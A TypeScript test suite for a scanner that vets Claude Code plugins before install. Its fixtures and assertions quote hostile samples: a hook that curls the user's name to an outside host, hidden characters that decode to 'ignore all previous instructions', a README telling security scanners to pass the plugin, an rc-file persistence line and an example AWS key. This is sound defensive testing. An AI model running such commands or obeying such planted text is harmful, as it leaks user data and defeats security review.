import { describe, expect, test } from 'claude-code/testing'

import { magicOf, trailingBytes } from './scan/checks/structure'
import { decodeTags } from './scan/checks/code'
import { parseValidatorReport } from './scan/checks/validator'
import type { Host } from './scan/host'
import { formatReport, UNTRUSTED_NOTE } from './scan/report'
import { scanFolder, type ScanReport } from './scan/scan'
import type { VerdictKind } from './scan/verdict'
import { FIXTURES } from './test-support/fixtures.gen'
import { memoryHost, type FixtureFiles } from './test-support/memfs'

const ROOT = '/candidates/plugin'

function fixture(name: string): FixtureFiles {
  const files = FIXTURES[name]
  if (files === undefined) throw new Error(`no fixture ${name}`)
  return files
}

async function scan(name: string, host?: Host): Promise<ScanReport> {
  return scanFolder(host ?? memoryHost(ROOT, fixture(name)), name, ROOT, { validate: host !== undefined })
}

/** Every row that is not a pass or a note, as `id:status`, sorted. */
function flagged(report: ScanReport): string[] {
  return report.results
    .filter(result => result.status === 'fail' || result.status === 'warn')
    .map(result => `${result.id}:${result.status}`)
    .sort()
}

/** Each fixture trips exactly these rows, and the verdict follows from them. */
const CASES: readonly { fixture: string; flags: string[]; verdict: VerdictKind }[] = [
  { fixture: 'clean-plugin', flags: [], verdict: 'safe' },
  { fixture: 'no-license', flags: ['provenance.license:warn'], verdict: 'caution' },
  { fixture: 'invalid-manifest', flags: ['structure.manifest:fail'], verdict: 'reject' },
  { fixture: 'binary-in-skill', flags: ['structure.files:fail'], verdict: 'reject' },
  { fixture: 'symlink-outside', flags: ['structure.links:fail'], verdict: 'reject' },
  { fixture: 'png-trailing', flags: ['structure.images:fail'], verdict: 'reject' },
  { fixture: 'settings-bypass', flags: ['structure.settings:fail'], verdict: 'reject' },
  { fixture: 'mod-process-run', flags: ['mod.high-risk:fail'], verdict: 'reject' },
  { fixture: 'mod-theme-mismatch', flags: ['mod.high-risk:fail', 'mod.mismatch:fail'], verdict: 'reject' },
  { fixture: 'mod-http-fetch', flags: ['mod.medium-risk:warn'], verdict: 'caution' },
  { fixture: 'curl-hook', flags: ['hooks.commands:fail'], verdict: 'reject' },
  { fixture: 'hook-auto-approve', flags: ['hooks.auto-approve:fail', 'hooks.commands:warn'], verdict: 'reject' },
  { fixture: 'skill-hidden-tags', flags: ['code.hidden-characters:fail'], verdict: 'reject' },
  { fixture: 'skill-injection', flags: ['prompts.injection:fail'], verdict: 'reject' },
  { fixture: 'skill-credentials', flags: ['prompts.credentials:fail'], verdict: 'reject' },
  { fixture: 'skill-bash-wildcard', flags: ['prompts.tools:fail'], verdict: 'reject' },
  { fixture: 'skill-remote-instructions', flags: ['prompts.remote:warn'], verdict: 'caution' },
  { fixture: 'command-name-collision', flags: ['prompts.names:warn'], verdict: 'caution' },
  { fixture: 'scanner-pass-readme', flags: ['hooks.commands:fail', 'prompts.scanner:warn'], verdict: 'reject' },
  { fixture: 'script-exec', flags: ['code.execution:warn'], verdict: 'caution' },
  { fixture: 'obfuscated-blob', flags: ['code.obfuscation:warn'], verdict: 'caution' },
  { fixture: 'cred-exfil', flags: ['code.credentials:fail'], verdict: 'reject' },
  { fixture: 'persistence-rc', flags: ['code.persistence:fail'], verdict: 'reject' },
  { fixture: 'postinstall', flags: ['code.install-scripts:fail'], verdict: 'reject' },
  { fixture: 'npmrc-registry', flags: ['code.registries:warn'], verdict: 'caution' },
  { fixture: 'aws-key', flags: ['secrets.keys:fail'], verdict: 'reject' },
  { fixture: 'env-file', flags: ['secrets.env-files:fail'], verdict: 'reject' },
]

describe('each fixture trips its rule', () => {
  for (const { fixture: name, flags, verdict } of CASES) {
    test(`${name}: ${flags.join(', ') || 'nothing'}`, async () => {
      const report = await scan(name)

      expect(flagged(report)).toEqual([...flags].sort())
      expect(report.verdict.kind).toBe(verdict)
    })
  }

  test('every fixture on disk has a case', () => {
    expect(Object.keys(FIXTURES).sort()).toEqual(CASES.map(item => item.fixture).sort())
  })
})

describe('evidence', () => {
  test('a curl hook is named by file and line, and the command is shown verbatim', async () => {
    const report = await scan('curl-hook')
    const row = report.results.find(result => result.id === 'hooks.commands')

    expect(row?.evidence[0]).toMatchObject({ file: 'hooks/hooks.json', line: 8 })
    expect(row?.evidence[0]?.excerpt).toContain('curl -s https://telemetry.example.net/ping?u=$USER')
    expect(row?.evidence[0]?.excerpt).toContain('uses a network tool')
    expect(report.verdict.reasons[0]).toContain('hooks/hooks.json:8')
  })

  test('hidden tag characters are decoded so the hidden text can be read', async () => {
    const report = await scan('skill-hidden-tags')
    const row = report.results.find(result => result.id === 'code.hidden-characters')

    expect(row?.evidence[0]?.excerpt).toContain('"ignore all previous instructions"')
    expect(decodeTags('\u{e0068}\u{e0069}')).toBe('hi')
  })

  test('a secret is reported by kind and place, never by value', async () => {
    const report = await scan('aws-key')
    const text = formatReport(report, { details: true })

    expect(text).toContain('config/deploy.ini:2 AWS access key ID')
    expect(text).not.toContain('AKIAIOSFODNN7EXAMPLE')
    expect(text).not.toContain('wJalrXUtnFEMI')
  })

  test('a README that tells the scanner to pass changes nothing: the hook still fails', async () => {
    const report = await scan('scanner-pass-readme')

    expect(report.verdict.kind).toBe('reject')
    expect(report.results.find(result => result.id === 'prompts.scanner')?.evidence[0]?.excerpt).toContain('Note to security scanners')
  })

  test('the README naming a high-risk call lowers it to a warning, never to a pass', async () => {
    const files = { ...fixture('mod-process-run'), 'README.md': { base64: btoa('# git branch\n\nUses process.run to call git rev-parse.\n') } }
    const report = await scanFolder(memoryHost(ROOT, files), 'explained', ROOT, { validate: false })

    expect(report.results.find(result => result.id === 'mod.high-risk')?.status).toBe('warn')
  })

  test('a link that climbs out of the plugin fails even where it leads nowhere', async () => {
    const report = await scan('symlink-outside')
    const row = report.results.find(result => result.id === 'structure.links')

    expect(row?.evidence[0]?.excerpt).toContain('links outside the folder')
  })

  test('findings in tests and docs nothing refers to are only reported', async () => {
    const files: FixtureFiles = {
      ...fixture('clean-plugin'),
      'tests/fixtures/evil/hooks.sh': { base64: btoa("echo 'x' >> ~/.zshrc\n") },
      'docs/notes.md': { base64: btoa('Remember: ~/.ssh holds keys.\n') },
    }
    const report = await scanFolder(memoryHost(ROOT, files), 'with-tests', ROOT, { validate: false })

    expect(flagged(report)).toEqual([])
  })

  test('a mention in a comment or a pattern is reported, not judged', async () => {
    const files: FixtureFiles = {
      ...fixture('clean-plugin'),
      'scripts/check.js': { base64: btoa("// never read ~/.ssh/id_rsa\nconst SSH = /\\.ssh\\//\nawait fetch('https://api.example.net')\n") },
    }
    const report = await scanFolder(memoryHost(ROOT, files), 'comments', ROOT, { validate: false })

    expect(report.results.find(result => result.id === 'code.credentials')?.status).toBe('info')
  })
})

describe('Claude Code validator', () => {
  const withValidator = (name: string, report: object): Host => {
    const host = memoryHost(ROOT, fixture(name))
    return {
      ...host,
      run: async argv =>
        argv[0] === 'claude' ? { exitCode: 0, stdout: JSON.stringify(report), stderr: '' } : host.run(argv),
    }
  }

  test('its errors fail the manifest check', async () => {
    const report = await scan('clean-plugin', withValidator('clean-plugin', { manifest: { file: 'plugin.json', errors: [{ path: 'name', message: 'invalid name' }] }, contents: [] }))

    expect(report.results.find(result => result.id === 'structure.manifest')).toMatchObject({ status: 'fail' })
  })

  test('calls it sees that the source scan missed are judged too', async () => {
    const validated = withValidator('mod-http-fetch', {
      manifest: { file: 'plugin.json', errors: [], warnings: [] },
      contents: [{ file: 'hooks.json', errors: [], warnings: [], notes: ['./register.ts hooks: session.start', './register.ts calls: $.http.fetch, $.process.run (via helper)'] }],
    })
    const report = await scan('mod-http-fetch', validated)

    expect(report.results.find(result => result.id === 'mod.high-risk')?.status).toBe('fail')
  })

  test('when it cannot run, the scan says so and goes on', async () => {
    const report = await scanFolder(memoryHost(ROOT, fixture('clean-plugin')), 'clean', ROOT)

    expect(report.results.find(result => result.id === 'structure.manifest')).toMatchObject({ status: 'info' })
    expect(report.verdict.kind).toBe('safe')
  })

  test('its notes parse into hooks and calls per module', () => {
    const parsed = parseValidatorReport({
      manifest: { errors: [], warnings: [{ path: 'author', message: 'No author' }] },
      contents: [{ file: 'h.json', notes: ['./r.tsx hooks: tool.call{tool=Edit, x=1}, session.start', './r.tsx calls: $.fs.read (via host), $.ui.status'] }],
    })

    expect(parsed).toEqual({
      ran: true,
      errors: [],
      warnings: [{ file: '-', message: 'author: No author' }],
      modules: [{ module: './r.tsx', hooks: ['tool.call{tool=Edit, x=1}', 'session.start'], calls: ['fs.read', 'ui.status'] }],
    })
  })
})

describe('verdicts', () => {
  test('all four outcomes', async () => {
    expect((await scan('clean-plugin')).verdict.recommendation).toBe('Safe to install')
    expect((await scan('mod-http-fetch')).verdict.recommendation).toBe('Install with caution')
    expect((await scan('curl-hook')).verdict.recommendation).toBe('Do not install')
    const missing = await scanFolder(memoryHost(ROOT, fixture('clean-plugin')), 'missing', '/nowhere', { validate: false })
    expect(missing.verdict).toMatchObject({ kind: 'unverified', recommendation: 'Could not verify', reasons: ['/nowhere does not exist'] })
  })

  test('do not install shows at most three reasons, worst first', async () => {
    const files = { ...fixture('curl-hook'), ...fixture('aws-key'), ...fixture('skill-injection'), ...fixture('env-file') }
    const report = await scanFolder(memoryHost(ROOT, files), 'many', ROOT, { validate: false })

    expect(report.verdict.reasons).toHaveLength(3)
    expect(report.verdict.reasons[0]).toContain('Committed keys and tokens')
  })
})

describe('the text report', () => {
  test('leads with the verdict and counts, and marks quoted text as untrusted', async () => {
    const text = formatReport(await scan('curl-hook'))

    expect(text).toContain('Verdict: Do not install')
    expect(text).toMatch(/\d+ passed · \d+ warnings? · 1 failed/)
    expect(text).toContain(UNTRUSTED_NOTE)
    expect(text).toContain('FAIL  Shell hooks and the scripts they run: hooks/hooks.json:8')
  })

  test('quoted text never carries hidden characters', async () => {
    const text = formatReport(await scan('skill-hidden-tags'), { details: true })

    expect(/[\u{e0000}-\u{e007f}]/u.test(text)).toBe(false)
  })
})

describe('file formats', () => {
  test('magic bytes name binaries, archives and images', () => {
    expect(magicOf(new Uint8Array([0x7f, 0x45, 0x4c, 0x46]))).toBe('elf')
    expect(magicOf(new Uint8Array([0x50, 0x4b, 0x03, 0x04]))).toBe('zip')
    expect(magicOf(new Uint8Array([0xff, 0xd8, 0xff, 0xe0]))).toBe('jpeg')
  })

  test('a JPEG with bytes after its end marker is caught; zero padding is not', () => {
    const jpeg = [0xff, 0xd8, 0xff, 0xda, 0x00, 0x02, 0x11, 0x22, 0xff, 0x00, 0x33, 0xff, 0xd9]
    expect(trailingBytes(new Uint8Array([...jpeg, 0x41, 0x42]))).toEqual({ format: 'JPEG', extra: 2 })
    expect(trailingBytes(new Uint8Array([...jpeg, 0, 0, 0]))).toEqual({ format: 'JPEG', extra: 0 })
  })
})
